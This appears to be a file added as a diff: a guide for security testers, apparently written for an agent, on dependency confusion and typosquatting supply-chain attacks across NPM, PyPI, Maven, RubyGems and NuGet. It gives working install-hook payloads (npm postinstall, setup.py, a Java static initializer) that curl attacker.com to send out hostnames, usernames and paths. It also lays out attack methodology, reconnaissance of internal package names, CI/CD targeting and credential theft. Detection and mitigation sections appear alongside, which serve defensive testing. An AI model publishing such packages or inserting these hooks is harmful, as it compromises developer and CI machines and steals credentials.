@@ -1,0 +1,364 @@
+<dependency_confusion_guide>
+<title>DEPENDENCY CONFUSION (Supply Chain Attack)</title>
+
+<critical>Dependency confusion exploits package manager behavior when resolving private vs public packages. Attackers upload malicious packages to public repositories (NPM, PyPI, Maven) with same names as private internal packages. Package managers may install public package instead of private, leading to RCE during installation. Focus on namespace analysis, install scripts, and registry priority.</critical>
+
+<scope>
+- NPM package confusion (Node.js/JavaScript)
+- PyPI namespace attacks (Python pip)
+- Maven/Gradle repository confusion (Java)
+- RubyGems internal package exposure
+- NuGet (.NET) package squatting
+- Private registry exploitation
+- package.json/requirements.txt analysis
+- Install script execution attacks (postinstall, setup.py)
+- Typosquatting detection and exploitation
+</scope>
+
+<methodology>
+1. Enumerate dependencies: analyze package.json, requirements.txt, pom.xml, Gemfile
+2. Identify private packages: internal naming patterns, scoped packages, internal registries
+3. Check public registries: search NPM, PyPI, Maven for conflicting names
+4. Test resolution priority: which registry is queried first
+5. Upload proof-of-concept package to public registry
+6. Trigger installation: CI/CD, developer machines, production deployments
+7. Capture execution: DNS callback, HTTP beacon, or file system marker
+8. Validate impact: show code execution during install phase
+</methodology>
+
+<package_managers>
+<npm_nodejs>
+<vulnerability_pattern>
+- Private packages: @company/lib-name or internal-lib-name
+- Unscoped private packages vulnerable: internal-lib-name
+- Scoped packages safer but if registry misconfigured: vulnerable
+
+Resolution order:
+1. Check .npmrc for registry
+2. If scoped (@company/), use scoped registry
+3. If unscoped, default to registry.npmjs.org
+4. Private package without scope → public NPM checked first (VULNERABLE)
+</vulnerability_pattern>
+
+<attack_vector>
+- Identify unscoped private package: "internal-auth-lib": "1.0.0"
+- Upload to NPM: npm publish internal-auth-lib@1.0.1 (higher version)
+- Target installs: npm install → fetches public package
+- Execution: postinstall script runs arbitrary code
+
+Example package.json:
+{
+  "name": "internal-auth-lib",
+  "version": "999.0.0",
+  "scripts": {
+    "postinstall": "node -e \"require('child_process').exec('curl http://attacker.com/pwned?host=' + require('os').hostname())\""
+  }
+}
+</attack_vector>
+
+<detection>
+- Scan package.json for unscoped internal packages
+- Check if package exists on NPM: npm view package-name
+- Test resolution: npm config get registry, npm view package-name --verbose
+- Monitor CI/CD logs for unexpected package sources
+- Use npm audit signatures to detect suspicious packages
+</detection>
+</npm_nodejs>
+
+<pypi_python>
+<vulnerability_pattern>
+- Private packages: company-lib, internal-utils
+- No namespace isolation in PyPI (unlike NPM scopes)
+- requirements.txt: internal-lib==1.0.0
+- Resolution order: check PyPI first unless --index-url specified
+
+Attack surface:
+- ANY private package name can be squatted on PyPI
+- Version precedence: higher version installed by default
+- pip install without --index-url or --extra-index-url → PyPI first
+</vulnerability_pattern>
+
+<attack_vector>
+- Find private package: internal-ml-lib==0.5.0
+- Upload to PyPI: twine upload internal-ml-lib-999.0.0
+- setup.py with malicious code:
+from setuptools import setup
+from setuptools.command.install import install
+import os
+
+class PostInstall(install):
+    def run(self):
+        install.run(self)
+        os.system('curl http://attacker.com/log?host=$(hostname)')
+
+setup(
+    name='internal-ml-lib',
+    version='999.0.0',
+    cmdclass={'install': PostInstall}
+)
+</attack_vector>
+
+<detection>
+- Parse requirements.txt for internal naming patterns
+- Search PyPI: pip index versions package-name
+- Check private index configuration: pip config list
+- Monitor pip install --dry-run for source resolution
+- Audit setup.py for suspicious install hooks
+</detection>
+</pypi_python>
+
+<maven_gradle_java>
+<vulnerability_pattern>
+- Maven coordinates: groupId:artifactId:version
+- Private repos: com.company.internal:lib-name:1.0.0
+- Public repos: Maven Central, JCenter
+- Resolution: pom.xml defines <repositories>, checked in order
+
+Vulnerability:
+- If public repo listed before private repo → public checked first
+- If groupId not unique (com.github.user.lib) → collision possible
+</vulnerability_pattern>
+
+<attack_vector>
+- Identify private artifact: com.company:internal-service:1.0.0
+- Register com.company on Maven Central (if available)
+- Upload malicious JAR with same coordinates, higher version
+- Build.gradle or pom.xml resolves to public package
+
+Execution in JAR:
+- Static initializer blocks execute on class load
+- Manifest with malicious Main-Class
+- Gradle plugin with execute-on-resolve
+</attack_vector>
+
+<detection>
+- Audit pom.xml <repositories> order
+- Check if groupId exists on Maven Central
+- Verify repository priority in settings.xml
+- Use dependency:tree to see resolution sources
+- Check for unexpected repository URLs in resolved deps
+</detection>
+</maven_gradle_java>
+
+<rubygems>
+<vulnerability_pattern>
+- Gem names: company-internal-lib
+- Resolution: Gemfile sources, default to rubygems.org
+- Private gems without private source → vulnerable
+
+source 'https://rubygems.org'
+gem 'internal-lib' # vulnerable if not scoped to private source
+</vulnerability_pattern>
+
+<attack_vector>
+- Upload to RubyGems: gem push internal-lib-999.0.0.gem
+- gemspec with extconf.rb for native extensions:
+  Runs arbitrary Ruby code during gem install
+</attack_vector>
+</rubygems>
+
+<nuget_dotnet>
+<vulnerability_pattern>
+- Package names: Company.Internal.Library
+- NuGet.org is default source
+- nuget.config defines sources and order
+
+Vulnerability:
+- Internal package without private feed configured
+- Public NuGet checked before private
+</vulnerability_pattern>
+
+<attack_vector>
+- Upload to NuGet.org with higher version
+- .nuspec with install.ps1 (PowerShell execution)
+- MSBuild targets that execute on restore/build
+</attack_vector>
+</nuget_dotnet>
+</package_managers>
+
+<exploitation_techniques>
+<version_bumping>
+- Private package: internal-lib@1.2.5
+- Attack package: internal-lib@999.0.0
+- Ensure attack version is higher than any realistic internal version
+- Automatic updates and version ranges (^1.0.0) will install attack package
+</version_bumping>
+
+<install_script_payloads>
+<npm_postinstall>
+"scripts": {
+  "postinstall": "node postinstall.js"
+}
+
+// postinstall.js
+const { exec } = require('child_process');
+const os = require('os');
+const dns = require('dns');
+
+const hostname = os.hostname();
+const exfil = `curl https://attacker.com/log?h=${hostname}&u=${os.userInfo().username}`;
+exec(exfil);
+</npm_postinstall>
+
+<python_setup_py>
+import os
+import base64
+from setuptools import setup
+
+# Execute during install
+os.system('curl http://attacker.com/pwned?pwd=' + base64.b64encode(os.getcwd().encode()).decode())
+
+setup(name='internal-lib', version='999.0.0')
+</python_setup_py>
+
+<java_static_init>
+// In JAR class file
+public class MaliciousInit {
+    static {
+        try {
+            Runtime.getRuntime().exec("curl http://attacker.com/java-pwned");
+        } catch (Exception e) {}
+    }
+}
+</java_static_init>
+</install_script_payloads>
+
+<exfiltration_channels>
+- DNS queries: use DNS TXT records or subdomain encoding
+  curl http://{base64_data}.attacker.com
+- HTTP callbacks: send env vars, file listings, credentials
+- File write: drop marker file in /tmp or user directory
+- Network scanning: identify internal networks, enumerate services
+</exfiltration_channels>
+</exploitation_techniques>
+
+<detection_and_reconnaissance>
+<finding_internal_packages>
+- GitHub/GitLab search: "package.json" OR "requirements.txt" org:target-company
+- Leaked package-lock.json: reveals full dependency tree
+- Job postings: mention internal library names
+- Developer blogs, conference talks: reference internal tools
+- Error messages: stack traces with internal package names
+- npm/pip cache directories on shared systems
+- Docker images: COPY package.json, RUN npm install
+</finding_internal_packages>
+
+<validating_vulnerability>
+1. Check if package exists on public registry:
+   - npm view internal-package-name
+   - pip search internal-package-name (deprecated but use API)
+   - mvn search for Maven
+2. Test resolution priority:
+   - Create test project with suspicious package
+   - Run install with --dry-run or verbose mode
+   - Check which registry is queried first
+3. Verify install script execution:
+   - Upload benign test package with DNS callback
+   - Trigger install in test environment
+   - Confirm callback received
+</validating_vulnerability>
+
+<ci_cd_targeting>
+- CI/CD pipelines often install dependencies automatically
+- Triggered by: pull requests, merges, scheduled builds
+- No human review of install logs
+- High-privilege execution environment (deploy keys, cloud credentials)
+- Target environments:
+  - GitHub Actions: npm install, pip install in workflow
+  - Jenkins: Maven builds, Gradle tasks
+  - GitLab CI: .gitlab-ci.yml with dependency installation
+  - CircleCI, Travis, etc.
+</ci_cd_targeting>
+</detection_and_reconnaissance>
+
+<typosquatting>
+<common_patterns>
+- Character substitution: request → requesť (unicode), requesc
+- Omission: express → expres, expresss
+- Addition: lodash → lodash-util, lodash-helpers
+- Hyphenation: colorstring → color-string, color_string
+- Scope confusion: lodash → @company/lodash
+
+Popular targets:
+- lodash, request, axios, django, flask, spring-boot
+- Generate variants programmatically
+</common_patterns>
+
+<attack_methodology>
+1. Identify popular packages with high download counts
+2. Generate typo variants (100s of permutations)
+3. Check which variants are unclaimed on registry
+4. Upload malicious packages with typo names
+5. Wait for accidental installations (typos in package.json)
+6. Execution via install scripts
+</attack_methodology>
+</typosquatting>
+
+<impact_scenarios>
+<credential_theft>
+- Environment variables: AWS keys, API tokens, SSH keys
+- Filesystem: .aws/credentials, .ssh/id_rsa, .npmrc tokens
+- Memory: extract from process environment
+- Network: credentials in CI/CD config, mounted secrets
+</credential_theft>
+
+<code_execution>
+- Install-time: postinstall, setup.py, gem extconf.rb
+- Runtime: malicious exports that replace legitimate functions
+- Persistent: add to startup scripts, cron jobs
+- Lateral: scan internal networks, exploit discovered services
+</code_execution>
+
+<supply_chain_compromise>
+- Developer machines: steal source code, inject backdoors
+- CI/CD: modify builds, inject malware into artifacts
+- Production: if package installed in prod, direct RCE
+- Persistence: malicious package in package-lock.json persists
+</supply_chain_compromise>
+</impact_scenarios>
+
+<validation>
+1. Identify private package name without namespace/scope
+2. Confirm package does not exist on public registry
+3. Show registry resolution order (public before private)
+4. Upload proof-of-concept package with DNS callback
+5. Trigger installation in test environment (not production!)
+6. Capture callback proving code execution
+7. Demonstrate exfiltration of non-sensitive test data
+8. Document impact potential (credential access, RCE scope)
+</validation>
+
+<false_positives>
+- Public package names that coincidentally match internal names
+- Private registries with correct priority configuration
+- Scoped NPM packages (@ namespace properly configured)
+- Systems with strict registry whitelisting
+- Environments with network isolation preventing exfiltration
+</false_positives>
+
+<impact>
+- Remote Code Execution on developer machines, CI/CD, production
+- Credential theft (cloud keys, API tokens, SSH keys)
+- Source code exfiltration
+- Supply chain compromise (inject backdoors into builds)
+- Internal network access and lateral movement
+- Persistent compromise via package lock files
+</impact>
+
+<pro_tips>
+1. Unscoped NPM packages are highest risk—scan package.json for non-@scoped internal packages
+2. Python has NO namespace isolation—all private PyPI package names are vulnerable
+3. CI/CD is prime target—automated installs without review
+4. Version 999.0.0 ensures precedence over internal versions
+5. DNS callbacks are quietest—less detectable than HTTP
+6. Check package-lock.json in public repos—full dependency tree revealed
+7. Test in isolated environment—never upload malicious packages to public registries without permission
+8. Combine with typosquatting—both attack vectors complement each other
+9. Monitor registry upload activity—detect malicious packages early
+10. Use private registry with authentication—prevent public resolution
+11. Scan for internal packages in GitHub before they're leaked
+12. Install hooks execute with full user privileges—high impact
+</pro_tips>
+
+<remember>Dependency confusion succeeds when package managers check public registries before private ones. Mitigate by using namespace/scopes (@company/), configuring registry priority correctly, and monitoring public registries for malicious packages matching internal names. Never use unscoped package names for private dependencies.</remember>
+</dependency_confusion_guide>
